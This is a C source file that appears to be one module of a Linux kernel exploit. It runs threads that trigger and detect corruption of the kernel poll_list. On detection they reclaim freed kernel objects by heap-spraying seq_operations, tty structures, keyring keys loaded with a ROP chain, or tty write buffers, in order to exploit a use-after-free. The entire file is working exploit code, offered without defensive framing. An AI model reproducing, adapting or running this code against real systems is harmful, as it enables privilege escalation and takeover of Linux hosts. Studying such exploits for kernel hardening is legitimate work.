#include <err.h>
#include <fcntl.h>
#include <keyutils.h>
#include <limits.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <x86intrin.h>

#include "../config.h"

#ifdef POLL_STUFF_DEBUG
#define DEBUG
#endif // POLL_STUFF_DEBUG

#include "utils.h"
#include "rw_pipe_and_tty.h"
#include "errhandling.h"
#include "sched_stuff.h"
#include "poll_stuff.h"
#include "rop.h"
#include "heap_spray.h"
#include "key_stuff.h"

struct poll_thread_args {
  int id;
  nfds_t nfds;
  int timeout;
  int barrier;
  enum spray_object reclaim_object; // if thread experiences corruption
				    // it sprays this object to reclaim
};

// set by the poll thread whose poll_list was corrupted
volatile int poll_list_corrupted;

// poll threads optionally wait here before going into the kernel
pthread_barrier_t poll_list_barrier;

/* number of poll threads currently in the kernel or the
 * subsequent critical section
 */
volatile uint64_t n_active_poll;

static pthread_t poll_tid[MAX_POLL_THREAD];

/* barrier: set if the thread should synchronize on the poll_list
 * 	barrier
 */
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunused-parameter"
static struct pollfd* do_poll(nfds_t nfds, int timeout, int id,
    int barrier)
#pragma clang diagnostic pop
{
  struct pollfd* pfds = NULL;

  CHECK_PTR(pfds = calloc(nfds, sizeof(struct pollfd)),
      "calloc pfds");

  // If revents == -1 _after_ returning from poll, our poll_list was
  // corrupted. If it wasn't corrupted, the kernel will have zeroed
  // the field.
  for (unsigned i = 0; i < nfds; i++) {
    pfds[i].revents = -1;
  }

  if (barrier) {
    LOGD("[T%d]: Start polling... (after main thread gives GO)", id);
  } else {
    LOGD("[T%d]: Start polling...", id);
  }

  __atomic_add_fetch(&n_active_poll, 1, __ATOMIC_RELAXED);

  PIN(EXPLOIT_CPU);

  // wait for main thread to give us the GO
  if (barrier) {
    pthread_barrier_wait(&poll_list_barrier);
  }

  CHECK_ZERO(poll(pfds, nfds, timeout), "poll");
  // start critical section (there might have been a memory corruption):
  // 	- S4: reclaim freed key
  // 	- S12: reclaim freed key and pipe buffers

  return pfds;
}

static void* entry_poll_thread(void* args)
{
  struct pollfd* pfds = NULL;
  enum spray_object reclaim_object;
  nfds_t nfds;
  int timeout, id, barrier;
  short indicator = 0;
  int ret = 0;

  id = ((struct poll_thread_args*)args)->id;
  nfds = ((struct poll_thread_args*)args)->nfds;
  timeout = ((struct poll_thread_args*)args)->timeout;
  barrier = ((struct poll_thread_args*)args)->barrier;
  reclaim_object = ((struct poll_thread_args*)args)->reclaim_object;

  free(args);
  args = NULL;

  pfds = do_poll(nfds, timeout, id, barrier);
  // start critical path (we might have to reclaim arbitrarily freed
  // object)

  // Kernel versions of our last two pfds were located in kmalloc32.
  // If our next pointer in kmalloc4k was corrupted, their revents
  // will not have been overwritten as walk->len was 0. Thus, we can use
  // it as an indicator to detect the corruption. (Depends on third
  // DWORD of object that we arbitrarily free being zero).
  indicator = pfds[nfds - 1].revents;
  if (indicator == -1) {
    // our return caused the corruption!
    switch (reclaim_object) {
      case OBJ_SEQ_OPS:
	// S 4: race to reclaim the key
	CHECK_ZERO(spray_seq_ops(), "spray_seq_ops");
	break;
      case OBJ_TTY:
	CHECK_ZERO(spray_tty(N_SPRAY_TTY), "spray_tty");
	break;
      case OBJ_ROP:
	// Figure out which key is UAF due to list cleanup to avoid
	// double-freeing it.
	CHECK_ZERO(identify_uaf_key(N_KEYS_2), "identify_uaf_key");

	// Need to throw away all those keys so we don't exceed our
	// quota. Keep only the one that was freed during list cleanup.
	CHECK_ZERO(free_keys(N_KEYS_2, 1), "free_keys");
	CHECK_ZERO(spray_keys(N_KEYS_3, NULL, 0, rop_chain_buf,
	    ROP_CHAIN_KBUF_SZ,
	    0), "spray_keys");
	break;
      case OBJ_TTY_WRITE_BUF:
	rw_pity_spray_tty_write_buf();
	break;
      case OBJ_INVAL:
	err(1, "[!] [ERR] %s",
	    "Invalid reclaim_object");
    }
    // end critical path, we had our chance to reclaim the slot(s)
    LOGS("[T%d]: My poll_list was corrupted! (%d)", id, ret);

    // tell main thread that corruption was successful
    poll_list_corrupted = 1;
  }
  // IDEA: maybe use some atomic boolean to indicate to other threads
  // that they can help spraying after corruption has happened.

  PIN(OTHER_CPU);
  // end critical path
  __atomic_sub_fetch(&n_active_poll, 1, __ATOMIC_RELAXED);
  LOGD("[T%d]: Polling complete (%d)", id, ret);

  return NULL;
}

int create_poll_thread(int id, nfds_t nfds, int timeout, int barrier,
    enum spray_object reclaim_object)
{
  struct poll_thread_args* args = NULL;
  int ret = 0;

  CHECK_PTR(args = calloc(1, sizeof(*args)), "calloc");

  args->id = id;
  args->nfds = nfds;
  args->timeout = timeout;
  args->barrier = barrier;
  args->reclaim_object = reclaim_object;

  CHECK_ZERO(pthread_create(&poll_tid[id], 0, entry_poll_thread,
	(void*)args), "pthread_create");

  return ret;
}

int join_poll_threads(int num_threads)
{
  int ret = 0;

  LOGI("Joining %d poll threads.", num_threads);
  for (int id = 0; id < num_threads; id++) {
    CHECK_ZERO(pthread_join(poll_tid[id], NULL), "pthread_join");
    LOGD("Joined %d", id);
  }

  return ret;
}
